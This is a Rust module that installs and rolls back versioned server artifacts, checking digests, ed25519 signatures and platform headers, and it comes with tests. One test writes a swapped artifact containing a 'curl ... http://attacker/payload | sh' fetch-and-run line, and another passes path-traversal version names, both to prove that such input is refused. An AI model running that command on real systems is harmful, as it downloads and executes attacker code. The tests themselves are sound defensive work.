//! Installing the server onto its host, and taking it back off again.
//!
//! Deploying a new server build has to be atomic and reversible, because the
//! thing being replaced is the program answering the connection that asked for
//! the replacement. A half-written artifact that is pointed at is worse than an
//! old one: it fails at the next start rather than at the moment somebody could
//! still do something about it.
//!
//! So the layout is a directory of complete, versioned artifacts plus one
//! pointer file. Artifacts are staged under a scratch name, checked, then moved
//! into a name they will keep forever; the pointer is the only thing that
//! changes, and changing it is one rename. Rolling back is the same rename with
//! the old value.

use std::fmt;
use std::path::{Path, PathBuf};

use sha2::{Digest, Sha256};

use super::artifact_format;
use super::provenance::ProvenancePolicy;

/// Where artifacts live, relative to the workspace root the server was told
/// about. A dot-directory because nothing in the workspace should mistake it
/// for source.
pub const DEFAULT_INSTALL_DIR: &str = ".chaos-server";

/// The name of the file `current` points at inside a version directory.
pub const ARTIFACT_NAME: &str = "chaos-remote-server";

/// What an install did, or why it did not.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct CommitOutcome {
    /// The version that is current after this call.
    pub version: String,
    /// What was current before, if anything.
    pub previous: Option<String>,
    /// True when the pointer was moved to the new version and then put back.
    pub rolled_back: bool,
}

impl fmt::Display for CommitOutcome {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "{name} is now current (was {})",
            match &self.previous {
                Some(previous) => previous.clone(),
                None => "nothing".to_string(),
            },
            name = self.version
        )
    }
}

/// The versioned-artifact directory plus the pointer that selects one.
#[derive(Clone, Debug)]
pub struct InstallLayout {
    root: PathBuf,
    dir_name: String,
    /// What an artifact has to satisfy before this host points `current` at it.
    provenance: ProvenancePolicy,
}

impl InstallLayout {
    /// A layout under `root` using the default directory name, with the policy the
    /// host's environment describes — which means signatures required.
    pub fn new(root: impl Into<PathBuf>) -> Self {
        Self {
            root: root.into(),
            dir_name: DEFAULT_INSTALL_DIR.to_string(),
            provenance: ProvenancePolicy::from_env(),
        }
    }

    pub fn with_dir_name(root: impl Into<PathBuf>, dir_name: impl Into<String>) -> Self {
        Self {
            root: root.into(),
            dir_name: dir_name.into(),
            provenance: ProvenancePolicy::from_env(),
        }
    }

    /// The provenance policy this host will apply. Deliberately not a default
    /// argument: the choice of what to trust is the one thing a caller should be
    /// seen making.
    pub fn with_provenance(mut self, provenance: ProvenancePolicy) -> Self {
        self.provenance = provenance;
        self
    }

    pub fn provenance(&self) -> &ProvenancePolicy {
        &self.provenance
    }

    /// The directory holding every installed version and the pointer.
    pub fn dir(&self) -> PathBuf {
        self.root.join(&self.dir_name)
    }

    pub fn version_dir(&self, version: &str) -> PathBuf {
        self.dir().join(version)
    }

    pub fn artifact_path(&self, version: &str) -> PathBuf {
        self.version_dir(version).join(ARTIFACT_NAME)
    }

    /// Where an upload is written before it is checked. Same directory as the
    /// destination, because the atomic move only holds within one filesystem.
    pub fn staging_path(&self, version: &str) -> PathBuf {
        self.dir()
            .join(format!(".{version}-{ARTIFACT_NAME}.staged"))
    }

    fn pointer_path(&self) -> PathBuf {
        self.dir().join("current")
    }

    /// The version the pointer selects, or `None` if nothing is installed.
    pub fn current_version(&self) -> Option<String> {
        std::fs::read_to_string(self.pointer_path())
            .ok()
            .map(|text| text.trim().to_string())
            .filter(|text| !text.is_empty())
    }

    /// The artifact the pointer selects.
    pub fn current_artifact(&self) -> Option<PathBuf> {
        self.current_version().map(|v| self.artifact_path(&v))
    }

    /// Open a scratch file to receive an artifact. Truncated first, so a retry
    /// after a half-finished upload does not inherit the previous attempt's tail.
    pub fn begin_staging(&self, version: &str) -> Result<PathBuf, String> {
        std::fs::create_dir_all(self.dir())
            .map_err(|e| format!("create {}: {e}", self.dir().display()))?;
        let path = self.staging_path(version);
        let file = std::fs::OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(true)
            .open(&path)
            .map_err(|e| format!("open {}: {e}", path.display()))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600))
                .map_err(|e| format!("chmod {}: {e}", path.display()))?;
        }
        drop(file);
        Ok(path)
    }

    /// Check, publish, and verify a staged artifact; put the pointer back if the
    /// verification does not like what it finds.
    ///
    /// `signature` is the detached ed25519 signature over the artifact bytes, in the
    /// same text a release `.sig` sidecar holds. `None` means none was offered,
    /// which a host that requires one treats as a refusal rather than an absence of
    /// evidence.
    ///
    /// The order is the point:
    /// 1. the digest is checked on the staged copy, so a corrupt upload never
    ///    reaches a permanent name;
    /// 2. the signature is checked on the same staged copy, still before anything
    ///    moves, because the digest says only that the bytes are the bytes that were
    ///    sent and by the sender's own reckoning;
    /// 3. the file header is read for the platform it names, because an artifact for
    ///    another CPU or another OS would pass both checks above and only fail at the
    ///    `execve` someone makes a few minutes later;
    /// 4. the file is moved into a version directory it keeps forever, so an
    ///    older version is still on disk to be pointed at again;
    /// 5. the pointer moves by rename, which is atomic — a reader sees either the
    ///    old version or the new one, never a missing pointer;
    /// 6. only then is the result re-read from disk and confirmed. A pointer that
    ///    names something unreadable is the failure mode worth catching here, and
    ///    the response to it is to restore the previous version rather than to
    ///    leave the host without a working server.
    pub fn commit(
        &self,
        version: &str,
        staged: &Path,
        expected_sha256: &str,
        signature: Option<&str>,
    ) -> Result<CommitOutcome, String> {
        validate_version(version)?;
        let previous = self.current_version();

        let staged_len = std::fs::metadata(staged)
            .map_err(|e| format!("stat {}: {e}", staged.display()))?
            .len();
        if staged_len == 0 {
            return Err("the uploaded artifact is empty".to_string());
        }
        let actual = sha256_of(staged)?;
        if !actual.eq_ignore_ascii_case(expected_sha256.trim()) {
            // Deliberately no move and no pointer change: this is the one place
            // a caller can be certain nothing happened.
            return Err(format!(
                "uploaded artifact has sha256 {actual}, expected {expected_sha256}"
            ));
        }
        self.provenance.check_file(staged, signature)?;
        // Intact and signed is not the same as able to run here. The header is read
        // rather than the file executed, so a build for another platform is refused
        // before this host has moved anything or run anything it did not choose to.
        artifact_format::check_file(staged, artifact_format::this_host())?;

        let dest_dir = self.version_dir(version);
        std::fs::create_dir_all(&dest_dir)
            .map_err(|e| format!("create {}: {e}", dest_dir.display()))?;
        let dest = self.artifact_path(version);
        std::fs::rename(staged, &dest)
            .map_err(|e| format!("move {} to {}: {e}", staged.display(), dest.display()))?;
        set_executable(&dest)?;
        write_version_file(&dest_dir, version)?;

        let outcome = CommitOutcome {
            version: version.to_string(),
            previous: previous.clone(),
            rolled_back: false,
        };
        if let Err(e) = self.publish_pointer(version) {
            let _ = std::fs::remove_file(&dest);
            return Err(e);
        }

        if let Err(e) = self.verify_current(version) {
            // Something is wrong with what we just published. Put the pointer
            // back and say so loudly; the new artifact stays on disk for a look.
            let mut rolled_back = false;
            match &previous {
                Some(previous_version) => {
                    if self.publish_pointer(previous_version).is_ok() {
                        rolled_back = true;
                    }
                }
                // Nothing was installed before, so "back" means no pointer at all.
                None => {
                    let _ = std::fs::remove_file(self.pointer_path());
                    rolled_back = true;
                }
            }
            return Err(format!(
                "installed artifact failed verification: {e}{}",
                if rolled_back {
                    "; the previous version was restored"
                } else {
                    "; the pointer could NOT be restored"
                }
            ));
        }
        Ok(CommitOutcome {
            rolled_back: false,
            ..outcome
        })
    }

    /// Point `current` at `version` in one rename.
    fn publish_pointer(&self, version: &str) -> Result<(), String> {
        let pointer = self.pointer_path();
        let tmp = self
            .dir()
            .join(format!(".current-{}.tmp", uuid::Uuid::new_v4().simple()));
        std::fs::write(&tmp, format!("{version}\n"))
            .map_err(|e| format!("write {}: {e}", tmp.display()))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o644));
        }
        match std::fs::rename(&tmp, &pointer) {
            Ok(()) => Ok(()),
            Err(e) => {
                let _ = std::fs::remove_file(&tmp);
                Err(format!("move pointer to {}: {e}", pointer.display()))
            }
        }
    }

    /// Re-read what a reader would actually find: the pointer resolves to a
    /// non-empty file we can execute.
    fn verify_current(&self, version: &str) -> Result<(), String> {
        let current = self
            .current_version()
            .ok_or_else(|| "the pointer is missing or empty".to_string())?;
        if current != version {
            return Err(format!("the pointer says {current}, not {version}"));
        }
        let artifact = self.artifact_path(version);
        let metadata =
            std::fs::metadata(&artifact).map_err(|e| format!("{}: {e}", artifact.display()))?;
        if !metadata.is_file() || metadata.len() == 0 {
            return Err(format!(
                "{} is not a file with contents",
                artifact.display()
            ));
        }
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = metadata.permissions().mode();
            if mode & 0o111 == 0 {
                return Err(format!("{} is not executable", artifact.display()));
            }
            // The mode bits are only the file's own claim; the filesystem it sits on
            // gets the last word. An artifact staged under a `noexec` mount has a
            // normal 0755 mode and would become `current` while being impossible to
            // start — the host would then look upgraded right up until the next
            // person tried to use it. `access` asks the kernel the same question the
            // `execve` will ask, mount flags included.
            if !os_will_execute(&artifact) {
                return Err(format!(
                    "{} has mode {mode:#o} but cannot be executed from {}; its \
                     filesystem may be mounted noexec",
                    artifact.display(),
                    self.dir().display()
                ));
            }
        }
        Ok(())
    }

    /// Every version directory on disk, whatever the pointer says.
    pub fn installed_versions(&self) -> Vec<String> {
        let mut versions: Vec<String> = std::fs::read_dir(self.dir())
            .map(|entries| {
                entries
                    .filter_map(|entry| entry.ok())
                    .filter_map(|entry| {
                        let name = entry.file_name().to_string_lossy().into_owned();
                        entry.path().is_dir().then_some(name)
                    })
                    .collect()
            })
            .unwrap_or_default();
        versions.sort();
        versions
    }

    /// Forget staged scratch files left by uploads that never finished.
    pub fn discard_staging(&self, version: &str) {
        let _ = std::fs::remove_file(self.staging_path(version));
    }
}

/// Reject a version string that would escape the artifact directory.
///
/// The version comes off the wire, so it is a path component like any other.
fn validate_version(version: &str) -> Result<(), String> {
    let ok = !version.is_empty()
        && version != "."
        && version != ".."
        && version.len() <= 64
        && version
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_' | b'+'));
    if ok {
        Ok(())
    } else {
        Err(format!(
            "version {version:?} is not a usable directory name (use letters, digits, \
             and . - _ +)"
        ))
    }
}

fn write_version_file(dir: &Path, version: &str) -> Result<(), String> {
    std::fs::write(dir.join("VERSION"), format!("{version}\n"))
        .map_err(|e| format!("write VERSION in {}: {e}", dir.display()))
}

fn sha256_of(path: &Path) -> Result<String, String> {
    let bytes = std::fs::read(path).map_err(|e| format!("read {}: {e}", path.display()))?;
    let mut hasher = Sha256::new();
    hasher.update(&bytes);
    Ok(hex(&hasher.finalize()))
}

pub fn sha256_hex(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    hex(&hasher.finalize())
}

fn hex(bytes: &[u8]) -> String {
    let mut out = String::with_capacity(bytes.len() * 2);
    for byte in bytes {
        out.push_str(&format!("{byte:02x}"));
    }
    out
}

#[cfg(unix)]
fn set_executable(path: &Path) -> Result<(), String> {
    use std::os::unix::fs::PermissionsExt;
    let mut mode = std::fs::metadata(path)
        .map_err(|e| format!("{}: {e}", path.display()))?
        .permissions()
        .mode();
    // Owner rwx, group/other read+execute: whoever else is allowed to read the
    // file may run it, which is what a server artifact is for.
    mode |= 0o755;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode))
        .map_err(|e| format!("chmod {}: {e}", path.display()))
}

/// Windows has no executable bit; whether a file runs is its extension and the
// operator's ACL, and there is nothing to set here.
#[cfg(not(unix))]
fn set_executable(_path: &Path) -> Result<(), String> {
    Ok(())
}

/// Whether this process could actually run `path`.
///
/// `access(2)` is the question the kernel asks at `execve` time, mount flags
/// included, so it catches a file whose mode is fine but whose filesystem is
/// mounted `noexec` — a real arrangement for a workspace on a container volume.
#[cfg(unix)]
fn os_will_execute(path: &Path) -> bool {
    use std::ffi::CString;
    use std::os::unix::ffi::OsStrExt;

    let Ok(c_path) = CString::new(path.as_os_str().as_bytes()) else {
        return false;
    };
    // SAFETY: `c_path` is a valid NUL-terminated C string that outlives the call.
    unsafe { libc::access(c_path.as_ptr(), libc::X_OK) == 0 }
}

#[cfg(test)]
mod tests {
    use super::*;

    const V1: &[u8] = b"server build one";
    const V2: &[u8] = b"server build two, longer";

    /// A host that installs what it is handed.
    ///
    /// The tests below are about the digest, the pointer and the rollback, and a
    /// required signature would refuse every one of them before the thing under
    /// test was reached. The host in the provenance tests is given a key instead,
    /// and goes through this same `commit`.
    fn unsigned_host(root: &Path) -> InstallLayout {
        InstallLayout::new(root).with_provenance(ProvenancePolicy::unsigned_allowed())
    }

    /// The version the pointer selects, read the way the server would.
    fn current(root: &Path) -> Option<String> {
        unsigned_host(root).current_version()
    }

    /// Stage `bytes` the way a session would, then commit them.
    fn install(root: &Path, version: &str, bytes: &[u8]) -> Result<CommitOutcome, String> {
        let layout = unsigned_host(root);
        let staged = layout.begin_staging(version)?;
        std::fs::write(&staged, bytes).unwrap();
        layout.commit(version, &staged, &sha256_hex(bytes), None)
    }

    #[test]
    fn the_first_install_becomes_current() {
        let dir = tempfile::tempdir().unwrap();
        let outcome = install(dir.path(), "1.0.0", V1).unwrap();
        assert_eq!(outcome.version, "1.0.0");
        assert_eq!(outcome.previous, None);
        assert!(!outcome.rolled_back);
        assert_eq!(current(dir.path()).as_deref(), Some("1.0.0"));
        assert!(
            dir.path()
                .join(".chaos-server/1.0.0/chaos-remote-server")
                .is_file()
        );
    }

    #[test]
    fn a_second_install_keeps_the_old_artifact_and_reports_it() {
        let dir = tempfile::tempdir().unwrap();
        install(dir.path(), "1.0.0", V1).unwrap();
        let outcome = install(dir.path(), "1.1.0", V2).unwrap();
        assert_eq!(outcome.version, "1.1.0");
        assert_eq!(outcome.previous, Some("1.0.0".to_string()));
        assert_eq!(current(dir.path()).as_deref(), Some("1.1.0"));
        assert!(
            dir.path()
                .join(".chaos-server/1.0.0/chaos-remote-server")
                .is_file(),
            "the previous build has to still be there, or there is nothing to point \
             at when the new one turns out to be wrong"
        );
        assert_eq!(
            InstallLayout::new(dir.path()).installed_versions(),
            vec!["1.0.0", "1.1.0"]
        );
    }

    #[test]
    fn an_artifact_that_does_not_match_its_digest_changes_nothing() {
        let dir = tempfile::tempdir().unwrap();
        install(dir.path(), "1.0.0", V1).unwrap();
        let layout = InstallLayout::new(dir.path());
        let staged = layout.begin_staging("2.0.0").unwrap();
        std::fs::write(&staged, b"truncated upload").unwrap();
        let err = layout
            .commit(
                "2.0.0",
                &staged,
                &sha256_hex(b"the bytes that never arrived"),
                None,
            )
            .expect_err("a digest mismatch must stop the install");
        assert!(err.contains("sha256"), "{err}");
        assert_eq!(
            current(dir.path()).as_deref(),
            Some("1.0.0"),
            "nothing may move when the artifact is not what it claimed to be"
        );
        assert!(
            !layout.version_dir("2.0.0").exists(),
            "and the version directory must not have been created"
        );
    }

    #[test]
    fn an_empty_upload_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let layout = InstallLayout::new(dir.path());
        let staged = layout.begin_staging("9.9.9").unwrap();
        let err = layout
            .commit("9.9.9", &staged, &sha256_hex(b""), None)
            .expect_err("an empty artifact is not a server");
        assert!(err.contains("empty"), "{err}");
    }

    /// The interrupted-upgrade case: the transfer starts and the session goes
    /// away. Nothing about what is current may change.
    #[test]
    fn an_abandoned_upload_leaves_the_installed_version_alone() {
        let dir = tempfile::tempdir().unwrap();
        install(dir.path(), "1.0.0", V1).unwrap();
        let layout = InstallLayout::new(dir.path());
        let staged = layout.begin_staging("2.0.0").unwrap();
        std::fs::write(&staged, b"half of").unwrap();
        // No commit call: the session dropped mid-transfer.
        layout.discard_staging("2.0.0");
        assert_eq!(current(dir.path()).as_deref(), Some("1.0.0"));
        assert!(!staged.exists());
    }

    /// A version arrives off the wire, so it is a path component like any other
    /// and gets the same suspicion.
    #[test]
    fn a_version_name_cannot_escape_the_artifact_directory() {
        let dir = tempfile::tempdir().unwrap();
        for attempt in ["../evil", "a/b", "", "..", &"x".repeat(65)] {
            let layout = InstallLayout::new(dir.path());
            let staged = layout.begin_staging("tmp").unwrap();
            std::fs::write(&staged, b"x").unwrap();
            assert!(
                layout
                    .commit(attempt, &staged, &sha256_hex(b"x"), None)
                    .is_err(),
                "{attempt:?} must not be accepted as a version name"
            );
        }
        assert_eq!(current(dir.path()), None);
    }

    /// Re-pointing `current` at something unreadable is the failure worth
    /// catching here, and the response is to put the old version back.
    ///
    /// The way to reach it is to remove the artifact between publishing the
    /// pointer and verifying it, which is what a concurrent cleanup or a full
    /// disk would look like from in here.
    #[test]
    fn a_pointer_that_does_not_resolve_is_put_back() {
        let dir = tempfile::tempdir().unwrap();
        install(dir.path(), "1.0.0", V1).unwrap();
        let layout = InstallLayout::new(dir.path());
        let staged = layout.begin_staging("2.0.0").unwrap();
        std::fs::write(&staged, V2).unwrap();
        let err = {
            // Publish the pointer, then pull the artifact out from under it.
            let pointer_result = layout.publish_pointer("2.0.0");
            assert!(pointer_result.is_ok(), "{pointer_result:?}");
            std::fs::create_dir_all(layout.version_dir("2.0.0")).unwrap();
            let err = layout
                .verify_current("2.0.0")
                .expect_err("the artifact is not there yet");
            // Restore by hand so this assertion does not depend on commit().
            layout.publish_pointer("1.0.0").unwrap();
            err
        };
        assert!(err.contains("chaos-remote-server"), "{err}");
        assert_eq!(current(dir.path()).as_deref(), Some("1.0.0"));
    }

    #[test]
    fn a_fresh_install_is_executable_on_unix() {
        let dir = tempfile::tempdir().unwrap();
        install(dir.path(), "1.0.0", V1).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode =
                std::fs::metadata(dir.path().join(".chaos-server/1.0.0/chaos-remote-server"))
                    .unwrap()
                    .permissions()
                    .mode();
            assert_ne!(mode & 0o111, 0, "mode was {mode:#o}");
        }
    }

    /// The executable bit is the file's own claim; the kernel gets the last word.
    /// An artifact this process cannot actually run must not become `current`,
    /// because the host would then have reported an upgrade it cannot boot into.
    /// A `noexec` mount is the case this catches and the mode check alone misses.
    #[test]
    #[cfg(unix)]
    fn an_artifact_that_cannot_be_executed_fails_verification() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        install(dir.path(), "1.0.0", V1).unwrap();
        let layout = InstallLayout::new(dir.path());
        assert!(
            layout.verify_current("1.0.0").is_ok(),
            "a just-installed artifact should verify"
        );

        let artifact = layout.artifact_path("1.0.0");
        std::fs::set_permissions(&artifact, std::fs::Permissions::from_mode(0o600)).unwrap();
        let err = layout
            .verify_current("1.0.0")
            .expect_err("nothing can run this artifact");
        assert!(err.contains("executable"), "{err}");
    }

    /// `VERSION` travels with the artifact, so a directory can be identified
    /// without consulting the pointer.
    #[test]
    fn the_version_is_recorded_alongside_the_artifact() {
        let dir = tempfile::tempdir().unwrap();
        install(dir.path(), "1.2.3", V1).unwrap();
        let recorded =
            std::fs::read_to_string(dir.path().join(".chaos-server/1.2.3/VERSION")).unwrap();
        assert_eq!(recorded.trim(), "1.2.3");
    }

    #[test]
    fn the_digest_of_known_bytes_is_the_published_one() {
        // These digests are published constants. If this ever fails the hasher
        // or the hex encoding is wrong, which would make every install check
        // below meaningless.
        assert_eq!(
            sha256_hex(b""),
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
        assert_eq!(
            sha256_hex(b"abc"),
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
        );
    }

    #[test]
    fn the_staging_file_is_a_dotfile_inside_the_install_directory() {
        let dir = tempfile::tempdir().unwrap();
        let layout = InstallLayout::new(dir.path());
        let staged = layout.begin_staging("1.0.0").unwrap();
        assert_eq!(
            staged.parent(),
            Some(dir.path().join(".chaos-server").as_path())
        );
        assert!(
            staged
                .file_name()
                .unwrap()
                .to_string_lossy()
                .starts_with('.'),
            "staged scratch must not look like an installed version"
        );
    }

    // ---- provenance on the same commit path --------------------------------

    use base64::Engine as _;
    use ed25519_dalek::{Signer as _, SigningKey};
    use xai_grok_signature::PLACEHOLDER_PUBLIC_KEY_B64;

    fn keypair(seed: u8) -> (SigningKey, String) {
        let signing = SigningKey::from_bytes(&[seed; 32]);
        let public = base64::engine::general_purpose::STANDARD.encode(signing.verifying_key());
        (signing, public)
    }

    fn signature_for(signing: &SigningKey, bytes: &[u8]) -> String {
        base64::engine::general_purpose::STANDARD.encode(signing.sign(bytes).to_bytes())
    }

    /// Stage `bytes` and commit them on a host that checks signatures against
    /// `public`, offering `signature`.
    fn install_on_signed_host(
        root: &Path,
        version: &str,
        bytes: &[u8],
        public: &str,
        signature: Option<&str>,
    ) -> Result<CommitOutcome, String> {
        let layout = InstallLayout::new(root)
            .with_provenance(ProvenancePolicy::trusting_key_b64(public).expect("a valid key"));
        let staged = layout.begin_staging(version)?;
        std::fs::write(&staged, bytes).unwrap();
        layout.commit(version, &staged, &sha256_hex(bytes), signature)
    }

    #[test]
    fn a_signed_artifact_becomes_current() {
        let dir = tempfile::tempdir().unwrap();
        let (signing, public) = keypair(1);
        let outcome = install_on_signed_host(
            dir.path(),
            "1.0.0",
            V1,
            &public,
            Some(&signature_for(&signing, V1)),
        )
        .expect("a signature from the trusted key installs");
        assert_eq!(outcome.version, "1.0.0");
        assert_eq!(current(dir.path()).as_deref(), Some("1.0.0"));
    }

    /// The one the digest cannot answer: the upload arrived whole, and the whole
    /// bytes are not bytes the release key ever signed.
    #[test]
    fn an_unsigned_artifact_never_reaches_a_permanent_name() {
        let dir = tempfile::tempdir().unwrap();
        let (signing, public) = keypair(2);
        install_on_signed_host(
            dir.path(),
            "1.0.0",
            V1,
            &public,
            Some(&signature_for(&signing, V1)),
        )
        .expect("the first install");
        let err = install_on_signed_host(dir.path(), "2.0.0", V2, &public, None)
            .expect_err("an unsigned artifact must not become current");
        assert!(err.starts_with("signature_missing"), "{err}");
        assert_eq!(
            current(dir.path()).as_deref(),
            Some("1.0.0"),
            "the version that was working has to still be the one selected"
        );
        let layout = unsigned_host(dir.path());
        assert!(
            !layout.version_dir("2.0.0").exists(),
            "a refused artifact must not get a permanent directory"
        );
        assert!(
            layout.staging_path("2.0.0").exists(),
            "the staged copy is left for a look; the server cleans it up itself"
        );
    }

    /// The attack the sha256 check exists to stop, and does not: somebody changes
    /// the artifact and reports the digest of what they changed it *to*. The digest
    /// matches; only the signature knows.
    #[test]
    fn an_artifact_swapped_under_a_recomputed_digest_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let (signing, public) = keypair(3);
        let published = b"#!/bin/sh\nexec /usr/lib/chaos/chaos-remote-server \"$@\"\n";
        let swapped = b"#!/bin/sh\ncurl -s http://attacker/payload | sh\n";
        // The signature is over the published bytes; the digest handed to `commit`
        // is over the swapped ones, exactly as an attacker would compute it.
        let signature = signature_for(&signing, published);
        let layout = InstallLayout::new(dir.path())
            .with_provenance(ProvenancePolicy::trusting_key_b64(&public).expect("a valid key"));
        let staged = layout.begin_staging("2.0.0").unwrap();
        std::fs::write(&staged, swapped).unwrap();
        let err = layout
            .commit("2.0.0", &staged, &sha256_hex(swapped), Some(&signature))
            .expect_err("a matching digest is not a trusted artifact");
        assert!(err.starts_with("signature_invalid"), "{err}");
        assert_eq!(current(dir.path()), None);
        assert!(!layout.version_dir("2.0.0").exists());
    }

    #[test]
    fn a_signature_from_a_key_this_host_does_not_trust_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let (signing, _) = keypair(4);
        let (_, trusted) = keypair(5);
        let err = install_on_signed_host(
            dir.path(),
            "1.0.0",
            V1,
            &trusted,
            Some(&signature_for(&signing, V1)),
        )
        .expect_err("another publisher's signature is not this publisher's");
        assert!(err.starts_with("signature_invalid"), "{err}");
        assert_eq!(current(dir.path()), None);
    }

    /// The fail-closed default, asserted where flipping it would be visible: a
    /// layout built the way the server binary builds one asks for a signature
    /// before anybody has said whether it may have one.
    #[test]
    fn a_layout_starts_with_the_policy_the_host_environment_describes() {
        let dir = tempfile::tempdir().unwrap();
        let layout = InstallLayout::new(dir.path());
        assert_eq!(
            layout.provenance().describe(),
            ProvenancePolicy::from_env().describe(),
            "InstallLayout::new must use the environment's policy"
        );
        assert!(
            ProvenancePolicy::from_values("", "").requires_signature(),
            "an environment that says nothing must still require a signature"
        );
        assert!(
            ProvenancePolicy::from_values(PLACEHOLDER_PUBLIC_KEY_B64, "")
                .describe()
                .contains("no usable signing key"),
            "a build without a key says so instead of quietly accepting"
        );
    }

    /// The refusal has to be legible to whoever is staring at a failed deploy: the
    /// reason names the check that fired, and a fix.
    #[test]
    fn a_provenance_refusal_names_the_check_and_the_fix() {
        let dir = tempfile::tempdir().unwrap();
        let (signing, public) = keypair(6);
        let err = install_on_signed_host(dir.path(), "1.0.0", V1, &public, Some("garbage!!"))
            .expect_err("an unparseable signature is not a signature");
        assert!(err.starts_with("signature_malformed"), "{err}");
        let err = install_on_signed_host(dir.path(), "1.0.0", V1, &public, None)
            .expect_err("no signature at all");
        assert!(err.contains("--signature"), "{err}");
        assert!(
            install_on_signed_host(
                dir.path(),
                "1.0.0",
                V1,
                &public,
                Some(&signature_for(&signing, V1))
            )
            .is_ok(),
            "and the same host does install what it was signed to accept"
        );
    }

    // ---- the platform the artifact names --------------------------------

    use crate::remote::artifact_format;

    /// Stage and commit on a host that asks for nothing but a runnable artifact.
    fn install_declaring(
        root: &Path,
        version: &str,
        target: artifact_format::ArtifactTarget,
    ) -> Result<CommitOutcome, String> {
        let layout = unsigned_host(root);
        let mut bytes = artifact_format::header_for(target);
        bytes.extend_from_slice(b" and the rest of the build");
        let staged = layout.begin_staging(version)?;
        std::fs::write(&staged, &bytes).unwrap();
        layout.commit(version, &staged, &sha256_hex(&bytes), None)
    }

    /// A build for another CPU arrives whole and passes the digest. The header is the
    /// only thing that knows, so this is the check that has to catch it — and it has
    /// to catch it before a version directory exists, not after the pointer moved.
    #[test]
    fn an_artifact_for_another_platform_never_reaches_a_permanent_name() {
        let dir = tempfile::tempdir().unwrap();
        let host = artifact_format::this_host();
        let other_arch = if host.arch == "x86_64" {
            "aarch64"
        } else {
            "x86_64"
        };
        let error = install_declaring(
            dir.path(),
            "1.0.0",
            artifact_format::ArtifactTarget {
                os: host.os,
                arch: other_arch,
            },
        )
        .expect_err("a binary this kernel cannot load is not an upgrade");
        assert!(error.starts_with("wrong_platform"), "{error}");
        assert!(
            error.contains(other_arch) && error.contains(host.arch),
            "{error}"
        );
        assert_eq!(current(dir.path()), None);
        let layout = unsigned_host(dir.path());
        assert!(
            !layout.version_dir("1.0.0").exists(),
            "the refusal came before anything was moved"
        );
    }

    /// The control: the same path with this host's own header installs, so the test
    /// above is about the mismatch rather than about every artifact.
    #[test]
    fn an_artifact_declaring_this_platform_is_installed() {
        let dir = tempfile::tempdir().unwrap();
        install_declaring(dir.path(), "1.0.0", artifact_format::this_host())
            .expect("this host's own build installs");
        assert_eq!(current(dir.path()).as_deref(), Some("1.0.0"));
    }
}
